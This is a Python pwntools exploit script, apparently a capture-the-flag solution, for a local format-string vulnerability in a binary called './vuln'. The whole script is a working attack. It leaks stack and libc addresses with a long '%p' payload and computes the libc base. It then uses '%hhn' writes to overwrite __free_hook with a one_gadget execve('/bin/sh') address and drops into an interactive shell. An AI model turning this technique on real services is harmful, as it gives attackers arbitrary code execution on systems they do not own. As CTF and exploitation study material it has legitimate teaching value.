#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template '--host==127.0.0.1'
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './vuln'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1337)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def encrypt(data):
    return b''.join([bytes([data[i] ^ 0xff]) for i in range(len(data))])

one_gadget1 = 0x4f3d5 #execve("/bin/sh", rsp+0x40, environ)
#constraints:
#  rsp & 0xf == 0
#  rcx == NULL
one_gadget2 = 0x4f432 #execve("/bin/sh", rsp+0x40, environ)
#constraints:
#  [rsp+0x40] == NULL
one_gadget3 = 0x10a41c #execve("/bin/sh", rsp+0x70, environ)
#constraints:
#  [rsp+0x70] == NULL
#free_hook = 0x1d1e20
free_hook = 0x3ed8e8

io = start()

p = b'AAAAAAAA'+b'|%p'*64+b'|ENDSTR'
io.sendline(p)
io.sendline(b'')

data = io.recvuntil(b'ENDSTR').split(b'|')
libc_base = int(data[1][2:], 16) - 0x3ec7e3
#libc_base = int(data[1][2:], 16) - 0x1cf743
log.success(f'LIBC BASE: {hex(libc_base)}')

byte1 = (((one_gadget2 + libc_base) & 0xff) - 2)
byte2 = (((one_gadget2 + libc_base) & 0xffff) >> 8) - byte1 - 4
byte3 = (((one_gadget2 + libc_base) & 0xffffff) >> 16) - byte2 - 32 - 22
byte4 = (((one_gadget2 + libc_base) & 0xffffffff) >> 24) - byte3 - byte2 - 34 + 234
byte5 = (((one_gadget2 + libc_base) & 0xffffffffff) >> 32) - byte4 - byte3 - byte2 - 36 - 22
byte6 = (((one_gadget2 + libc_base) & 0xffffffffffff) >> 40) - byte5 - byte4 - byte3 - byte2 - 38 - 22

while byte1 > byte2:
    byte2 += 0x100
while byte2 > byte3:
    byte3 += 0x100
while byte3 > byte4:
    byte4 += 0x100
while byte4 > byte5:
    byte5 += 0x100
while byte5 > byte6:
    byte6 += 0x100

p = b''
p += b'|%' + bytes(str(byte1), 'ASCII') + b'x|%26$hhn'
p += b'|%' + bytes(str(byte2), 'ASCII') + b'x|%27$hhn'
p += b'|%' + bytes(str(byte3), 'ASCII') + b'x|%28$hhn'
p += b'|%' + bytes(str(byte4), 'ASCII') + b'x|%29$hhn'
p += b'|%' + bytes(str(byte5), 'ASCII') + b'x|%30$hhn'
p += b'|%' + bytes(str(byte6), 'ASCII') + b'x|%31$hhn'
p += b'|%26$s|ENDSTR'
p = p.ljust(128, b'A')
p += p64(free_hook + libc_base)
p += p64(free_hook + libc_base + 1)
p += p64(free_hook + libc_base + 2)
p += p64(free_hook + libc_base + 3)
p += p64(free_hook + libc_base + 4)
p += p64(free_hook + libc_base + 5)

io.sendline(p)
io.sendline(b'')

data = io.recvuntil(b'ENDSTR').split(b'|')
print(hex(libc_base + one_gadget2))
print(hex(u64(data[-2].ljust(8, b'\x00'))))

#print(data)

io.interactive()

